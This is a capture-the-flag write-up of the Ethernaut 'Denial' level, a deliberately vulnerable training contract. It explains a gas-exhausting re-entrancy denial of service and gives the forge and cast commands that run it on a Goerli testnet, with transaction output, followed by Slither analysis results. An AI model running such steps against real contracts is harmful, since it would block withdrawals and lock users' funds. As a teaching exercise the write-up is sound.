# Denial

[Ethernaut Denial](https://ethernaut.openzeppelin.com/level/0xD0a78dB26AA59694f5Cb536B50ef2fa00155C488)

1. The `Denial` contract is vulnerable to re-entrancy. 
1. The attack drains the transaction from all gas through repeated re-entrancy.
1. This causes the remaining part of the `withdraw` function to fail.

Denial Address: <BR />
`0x41c98A91568513229949638b4db15Bb7D4090F90`


<BR />

## Attack Test


```BASH
forge test --match-contract DenialTestFork --match-test test_BlockTransfers -vvvv
```

<BR />

## Live Attack

Deploy attack Contract:

```BASH
forge create \
      --private-key PRIVATE_KEY_1  \
      --rpc-url https://goerli.infura.io/v3/PROJECT_ID  \
      src/Attack.sol:Attack

# Deployer: 0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18
# Deployed to: 0x267f3bee69476E8fDba922293865E92de57b9a2c
# Transaction hash: 0x1f78c4004cae1420bc96973791c81b1c4c9e2102efed5ef8f02c6b80ccb335cd      
```

* Read `PROJECT_ID` and `PRIVATE_KEY_1` from `.env` file.

* Specify the `--private-key` without `0x` prefix.


Read properties from Denial contract:

```BASH
cast call 0x41c98A91568513229949638b4db15Bb7D4090F90 \
    "owner()(address)" \
    --rpc-url https://goerli.infura.io/v3/PROJECT_ID
# 0x0000000000000000000000000000000000000A9e    

cast call 0x41c98A91568513229949638b4db15Bb7D4090F90 \
    "partner()(address)" \
    --rpc-url https://goerli.infura.io/v3/PROJECT_ID
# 0x0000000000000000000000000000000000000000

cast call 0x41c98A91568513229949638b4db15Bb7D4090F90 \
    "contractBalance()(uint256)" \
    --rpc-url https://goerli.infura.io/v3/PROJECT_ID
# 1000000000000000
```

Set the withdraw partner to point at our `Attack` contract:
```BASH
cast send 0x41c98A91568513229949638b4db15Bb7D4090F90 \
    "setWithdrawPartner(address)" \
    0x267f3bee69476E8fDba922293865E92de57b9a2c \
    --private-key PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/PROJECT_ID

# blockHash               0x9c5028784d95f2ccb1744b7c6b974eb4d82dd66de84ed7eb52327b03c289881f
# blockNumber             9216866
# contractAddress
# cumulativeGasUsed       100157
# effectiveGasPrice       3000001833
# gasUsed                 43864
# logs                    []
# logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
# root
# status                  1
# transactionHash         0xee412780d77f522e75d33362581df4a0bb71445b57f6302807651699cd004de5
# transactionIndex        2
# type                    2

cast call 0x41c98A91568513229949638b4db15Bb7D4090F90 \
    "partner()(address)" \
    --rpc-url https://goerli.infura.io/v3/PROJECT_ID
# 0x267f3bee69476E8fDba922293865E92de57b9a2c
```

Test out attack:

```BASH
cast send 0x41c98A91568513229949638b4db15Bb7D4090F90 \
    "withdraw()" \
    --gas-limit 1000000 \
    --private-key PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/PROJECT_ID
# blockHash               0x1a31cd8d0ed3c9d6199019bfb307956d524dce9010c89744c951ab01d9c77bb0
# blockNumber             9216912
# contractAddress
# cumulativeGasUsed       1241517
# effectiveGasPrice       3000001283
# gasUsed                 1000000
# logs                    []
# logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
# root
# status                  0
# transactionHash         0x5a567e9ee5a1be649ec9cf7c7c3c07537faf96919a3e2811ff583aa445ed2eb2
# transactionIndex        7
# type                    2

cast call 0x41c98A91568513229949638b4db15Bb7D4090F90 \
    "contractBalance()(uint256)" \
    --rpc-url https://goerli.infura.io/v3/PROJECT_ID
# 1000000000000000
```



<BR />

## Vulnerability Testing Tools


<BR />

### Slither

__Bug Detect:__ Vulnerability classifed as "informational".

```BASH
solc-select use 0.8.0
slither ./src/Denial.sol  --exclude-optimization
```

```
Denial.withdraw() (src/Denial.sol#16-25) sends eth to arbitrary user
        Dangerous calls:
        - partner.call{value: amountToSend}() (src/Denial.sol#20)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations

Denial.withdraw() (src/Denial.sol#16-25) ignores return value by partner.call{value: amountToSend}() (src/Denial.sol#20)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#unchecked-low-level-calls

Denial.setWithdrawPartner(address)._partner (src/Denial.sol#11) lacks a zero-check on :
                - partner = _partner (src/Denial.sol#12)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#missing-zero-address-validation

Reentrancy in Denial.withdraw() (src/Denial.sol#16-25):
        External calls:
        - partner.call{value: amountToSend}() (src/Denial.sol#20)
        External calls sending eth:
        - partner.call{value: amountToSend}() (src/Denial.sol#20)
        - address(owner).transfer(amountToSend) (src/Denial.sol#21)
        State variables written after the call(s):
        - timeLastWithdrawn = block.timestamp (src/Denial.sol#23)
        - withdrawPartnerBalances[partner] += amountToSend (src/Denial.sol#24)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-2

Pragma version^0.8.0 (src/Denial.sol#2) allows old versions
solc-0.8.0 is not recommended for deployment
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity

Low level call in Denial.withdraw() (src/Denial.sol#16-25):
        - partner.call{value: amountToSend}() (src/Denial.sol#20)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#low-level-calls

Parameter Denial.setWithdrawPartner(address)._partner (src/Denial.sol#11) is not in mixedCase
Constant Denial.owner (src/Denial.sol#7) is not in UPPER_CASE_WITH_UNDERSCORES
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions

Reentrancy in Denial.withdraw() (src/Denial.sol#16-25):
        External calls:
        - address(owner).transfer(amountToSend) (src/Denial.sol#21)
        External calls sending eth:
        - partner.call{value: amountToSend}() (src/Denial.sol#20)
        - address(owner).transfer(amountToSend) (src/Denial.sol#21)
        State variables written after the call(s):
        - timeLastWithdrawn = block.timestamp (src/Denial.sol#23)
        - withdrawPartnerBalances[partner] += amountToSend (src/Denial.sol#24)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-4
./src/Denial.sol analyzed (1 contracts with 76 detectors), 10 result(s) found
```